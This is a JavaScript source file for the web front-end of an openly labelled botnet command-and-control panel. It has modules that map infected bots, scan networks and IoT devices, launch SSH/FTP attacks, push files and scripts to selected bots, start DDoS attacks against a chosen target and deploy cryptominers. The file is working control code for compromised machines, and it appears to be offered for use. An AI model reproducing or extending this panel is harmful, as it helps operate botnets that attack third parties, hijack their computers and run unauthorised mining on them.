/*
#############################################################################
#	Copyright (C) 2018  Javier Mínguez @JaviMrSec							#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################
*/

//------------ BOTNET MAP ------------
$(function() {
	$(document).ready(function() {
        $.ajax({
			type: 'POST',
            url: '/botnetmap',
			contentType: false,
            success: function(data){
				var obj = data;
				var array = []
				var targetSVG = "M9,0C4.029,0,0,4.029,0,9s4.029,9,9,9s9-4.029,9-9S13.971,0,9,0z M9,15.93 \
				c-3.83,0-6.93-3.1-6.93-6.93S5.17,2.07,9,2.07s6.93,3.1,6.93,6.93S12.83,15.93,9,15.93 M12.5, \
				9c0,1.933-1.567,3.5-3.5,3.5S5.5,10.933,5.5,9S7.067,5.5,9,5.5 S12.5,7.067,12.5,9z";
				dic=[]
				$.each(data['data'], function(value){
					dic.push(
						{
						  "svgPath": targetSVG,
						  "zoomLevel": 5,
						  "scale": 0.5,
						  "title": data['data'][value][0],
						  "latitude": data['data'][value][2],
						  "longitude": data['data'][value][1]
						}
					);

				});

				var botnet_map = AmCharts.makeChart( "chartdiv", {
				  "type": "map",
				  "projection": "winkel3",
				  "theme": "light",
				  "imagesSettings": {
				    "rollOverColor": "darkorange",
				    "rollOverScale": 3,
				    "selectedScale": 3,
				    "selectedColor": "orange",
				    "color": "#13564e"
				  },

				  "areasSettings": {
				    "unlistedAreasColor": "orange",
				    "outlineThickness": 0.1
				  },

				  "dataProvider": {
				    "map": "worldLow",
				    "images": dic,

				  "export": {
				    "enabled": false
				  }
				}
				});
		      },
		error: function(error) {
			console.log(error);
			}
		});

	});
});


//------------ NET SCANNER MODULE ------------

$( document ).ready(function() {
  $('#boton_buscador').click(function(){
    $('#gif_cargando').show();
    $('#net_footer').empty();
  });
});
//------------ IOT SCANNER MODULE ------------

$( document ).ready(function() {
  $('#boton_iot').click(function(){
    $('#gif_iot').show();
    $('#iot_footer').empty();
  });
});

//------------ SSH/FTP ATTACK MODULE ------------

$( document ).ready(function() {
  $('#boton_ssh').click(function(){
    $('#load_ssh').show();
    $('#results_body').empty();
  });
});

function check_text_disabled() {
  if($('#ssh_checkbox').is(':checked') == true){
    $('#ssh_box').val('');
    $('#ssh_box').prop( 'disabled',true );
  }
  else{
    $('#ssh_box').prop( 'disabled', false );
  }

};

function submit_bot_form(){
	alert('submiting');
	$('#bot_panel_form').submit();
}

//------------ UPLOAD FILES MODULE ------------
$( document ).ready(function() {
  $('#upload_file_btn').click(function(){
    $('#load_upload').show();
  });
  $('#file').change(function(e){
            var fileName = e.target.files[0].name;
			$('#label_file').text(fileName);
        });
});


$(function() {
    $('#upload_file_btn').click(function() {
        var form_data = new FormData($('#upload_file')[0]);
        $.ajax({
            type: 'POST',
            url: '/uploadajax',
            data: form_data,
            contentType: false,
            cache: false,
            processData: false,
            async: false,
            success: function(data) {
				var obj = data;
				$('#results_body').empty();
				$('#results_body').append(
				$('<h3>',{'text':'Results: '}),
				$('<hr>'),
				$('<p>',{'text':'Node: '.concat('C&C')}),
				$('<p>',{'text':'File uploaded: '.concat(obj['filename'])})
				);
				$('#load_upload').hide();
		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
});

//------------ CHECK SERVER FILES ------------
$(function() {
    $(document).ready(function() {
        $.ajax({
            type: 'POST',
            url: '/serverfiles',
            contentType: false,
            success: function(data) {
                $.each(data['files'], function(value){
					$("#select_files").append(
						$('<option>', {
						    value: data['files'][value],
						    text: data['files'][value]
							})
						)
					$("#select_files_panel").append(
						$('<option>', {
						    value: data['files'][value],
						    text: data['files'][value]
							})
						)

				});
            },
        });
    });
});

//------------ CHECK TARGETS IN DB FOR PAYLOAD ------------
$(function() {
    $(document).ready(function() {
        $.ajax({
            type: 'POST',
            url: '/payload_targets',
            contentType: false,
            success: function(data) {
                $.each(data['data'], function(value){
					$("#payload_targets").append(
						$('<option>', {
						    value: data['data'][value],
						    text: data['data'][value]
							})
						)

				});
            },
        });
    });
});

//------------ PAYLOAD MODULE ------------

function check_target_db() {
  if($('#db_targets').is(':checked') == true){
    $('#payload_box').hide().prop( "disabled", true );
	$('#payload_targets').show();
    // $('#ssh_box').prop( 'disabled',true );
  }
  else{
	 $('#payload_targets').hide();
	 $('#payload_box').prop( 'disabled', false ).show();

  }
};

function pload(){
    $('#payload_load').show();
    $('#results_body').empty();
};


//------------ CHECK BOTS ------------
$(function() {
	$(document).ready(function() {
    $('#check_bots').click(function() {
        var form_data = new FormData($('#upload_file')[0]);
        $.ajax({
			type: 'POST',
            url: '/checkbots',
            contentType: false,
            success: function(data) {
				var t = $('#bot_table').DataTable();
				t.clear().draw();
				$.each(data['data'], function(value){

					t.row.add([
					data['data'][value][0],
					data['data'][value][1],
					data['data'][value][2],
					data['data'][value][3],
					data['data'][value][4],
					data['data'][value][5],
					'<input type="checkbox" id="chx-'+data['data'][value][0]+'" name="check" class="form-check-input position-static checkbox_table" value='+data['data'][value][1]+'>',
				]).draw(false);

				});
		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
	});
});


//------------ BOT PANEL ------------

//datatable
$(document).ready(function() {
    $('#bot_table').DataTable( {
        "scrollY": "337px",
        "scrollCollapse": true,
        "paging": false,
		"searching": false,
		"bInfo" : false
    } );
} );

//wizard
$(function(){
	$('#submit_bots').click(function(){
			$('#prerun').show();
		});
});

//Cerrar ventana prebusqueda
$(function(){
	$('#close_modal').click(function(){
		$('#ddos_form_div').hide();
		$('#load_form_div').hide();
		$('#run_form_div').hide();
		$('#crypto_form_div').hide();
		$('#div-btn-panel').show();
		$('#back_modal').hide();
		$('#prerun').hide();
	});
});

//Go back in modal
$(function(){
	$('#back_modal').click(function(){
		$('#ddos_form_div').hide();
		$('#load_form_div').hide();
		$('#run_form_div').hide();
		$('#crypto_form_div').hide();
		$('#div-btn-panel').show();
		$('#back_modal').hide();
	});
});

//Restore panel
function clear_panel(){

	$('#ddos_form_div').hide()
	$('#load_form_div').hide()
	$('#run_form_div').hide()
	$('#crypto_form_div').hide();
	$('#div-btn-panel').show();
	$('#back_modal').hide();
	$('#prerun').hide();

}

//Select all bots
$(function(){
	$('input[name="select_all_bots"]').click(function(){
		if($('#select_all_bots').is(":checked")){
			$('#bot_table_body input').prop("checked", true)
		}
		else{
			$('#bot_table_body input').prop("checked", false)
		};
		});
});

//ddos panel
$(function(){
	$('#bot_ddos').click(function(){
		$('#div-btn-panel').hide();
		$('#modal-title-panel').text('DDOS');
		$('#back_modal').show();
		$('#ddos_form_div').show();
		});
});

//load panel
$(function(){
	$('#bot_load_files').click(function(){
		$('#div-btn-panel').hide();
		$('#modal-title-panel').text('Load files');
		$('#back_modal').show();
		$('#load_form_div').show();
		});
});

//run panel
$(function(){
	$('#bot_run').click(function(){
		$('#div-btn-panel').hide();
		$('#modal-title-panel').text('Run script');
		$('#back_modal').show();
		$('#run_form_div').show();
		});
});

//crypto panel
$(function(){
	$('#bot_crypto').click(function(){
		$('#div-btn-panel').hide();
		$('#modal-title-panel').text('Cryptominer');
		$('#back_modal').show();
		$('#crypto_form_div').show();
		});
});



//DDOS
$(function() {
	$(document).ready(function() {
    $('#btn_ddos_run').click(function() {
		var hosts = [];
		var data = new Object();
		$('#bot_table_body input:checked').each(function() {
	            hosts.push($(this).val());
	        });
		data.bots = hosts;
		data.target = $('#ddos_panel_box').val();
		data_json = JSON.stringify(data);
        $.ajax({
			type: 'POST',
            url: '/ddos',
            data: data_json,
			contentType: false,
            success: function(data) {
				clear_panel();
				var obj = data;
				$('#results_body').empty();
				$('#results_body').append(
				$('<h3>',{'text':'DDOS attack results: '}),
				$('<hr>'),
				$('<p>',{'text':'Node: '.concat('C&C')}),
				$('<p>',{'text':'Target: '.concat(obj['target'])}),
				$('<p>',{'text':'Bots launched: '}),
				);
				$.each(data['bots'], function(value){
					$('#results_body').append(
						$('<p>',{'text': 'Bot: '.concat(obj['bots'][value][0])}),
						$('<p>',{'text': 'Run ddos script: '.concat(obj['bots'][value][1])}),
					);
				});

		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
	});
});

//Load files panel
$(function() {
	$(document).ready(function() {
    $('#btn_load_run').click(function() {
		var hosts = [];
		var data = new Object();
		$('#bot_table_body input:checked').each(function() {
	            hosts.push($(this).val());
	        });
		data.hosts = hosts;
		data.filename = $('#select_files_panel').val();
		data_json = JSON.stringify(data);
        $.ajax({
			type: 'POST',
            url: '/loadpanelfiles',
            data: data_json,
			contentType: false,
            success: function(data){
				clear_panel();
				var obj = data;
				$('#results_body').empty();
				$('#results_body').append(
				$('<h3>',{'text':'Load files results: '}),
				$('<hr>'),
				$('<p>',{'text':'Node: '.concat('C&C')}),
				$('<p>',{'text':'File uploaded: '.concat(obj['filename'])}),
				$('<p>',{'text':'Total time: '.concat(obj['total_time'])}),
				$('<p>',{'text':'Hosts: '}),
				);
				$.each(data['hosts'], function(value){
					$('#results_body').append(
						$('<p>',{'text': 'Host: '.concat(obj['hosts'][value][0])}),
						$('<p>',{'text': 'Load file: '.concat(obj['hosts'][value][1])}),
					);
				});

		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
	});
});


//Run python scripts panel
$(function() {
	$(document).ready(function() {
    $('#btn_run_panel').click(function() {
		var hosts = [];
		var data = new Object();
		$('#bot_table_body input:checked').each(function() {
	            hosts.push($(this).val());
	        });
		data.hosts = hosts;
		data.script_name = $('#run_panel_box').val();
		data_json = JSON.stringify(data);
        $.ajax({
			type: 'POST',
            url: '/runpanelscripts',
            data: data_json,
			contentType: false,
            success: function(data){
				clear_panel();
				var obj = data;
				$('#results_body').empty();
				$('#results_body').append(
				$('<h3>',{'text':'Script run results: '}),
				$('<hr>'),
				$('<p>',{'text':'Node: '.concat('C&C')}),
				$('<p>',{'text':'File uploaded: '.concat(obj['script_name'])}),
				$('<p>',{'text':'Total time: '.concat(obj['total_time'])}),
				$('<p>',{'text':'Hosts: '}),
				);
				$.each(data['hosts'], function(value){
					$('#results_body').append(
						$('<p>',{'text': 'Host: '.concat(obj['hosts'][value][0])}),
						$('<p>',{'text': 'Run script: '.concat(obj['hosts'][value][1])}),
					);
				});

		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
	});
});

//Run crypto scripts panel
$(function() {
	$(document).ready(function() {
    $('#btn_crypto_panel').click(function() {
		var hosts = [];
		var data = new Object();
		$('#bot_table_body input:checked').each(function() {
	            hosts.push($(this).val());
	        });
		data.hosts = hosts;
		data.server = $('#crypto_panel_box_server').val();
		data.user = $('#crypto_panel_box_user').val();
		data.u_pass = $('#crypto_panel_box_pass').val();
		data.coin = $('#select_coin_panel').val();
		data_json = JSON.stringify(data);
        $.ajax({
			type: 'POST',
            url: '/crypto',
            data: data_json,
			contentType: false,
            success: function(data){
				clear_panel();
				var obj = data;
				$('#results_body').empty();
				$('#results_body').append(
				$('<h3>',{'text':'Cryptominer results: '}),
				$('<hr>'),
				$('<p>',{'text':'Server: '.concat(obj['server'])}),
				$('<p>',{'text':'User: '.concat(obj['user'])}),
				$('<p>',{'text':'Pass: '.concat(obj['u_pass'])}),
				$('<p>',{'text':'Hosts: '}),
				);
				$.each(data['res'], function(value){
					$('#results_body').append(
						$('<p>',{'text': 'Host: '.concat(obj['res'][value][0])}),
						$('<p>',{'text': 'Load crypto: '.concat(obj['res'][value][1])}),
						$('<p>',{'text': 'Run crypto: '.concat(obj['res'][value][2])}),
					);
				});

		      },
		error: function(error) {
			console.log(error);
			}
		});
    });
	});
});
